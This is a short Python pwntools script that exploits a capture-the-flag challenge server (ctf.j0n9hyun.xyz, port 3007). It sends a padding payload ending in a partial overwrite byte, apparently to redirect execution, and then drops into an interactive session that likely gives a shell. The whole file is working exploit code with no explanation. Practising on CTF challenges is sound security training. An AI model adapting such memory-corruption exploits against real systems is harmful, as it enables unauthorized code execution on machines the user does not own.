from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3007)

print p.recvuntil('call?\n')

payload = ''
payload += '\x90'*30
payload += '\xd8'

p.sendline(payload)

sleep(0.5)

p.interactive()
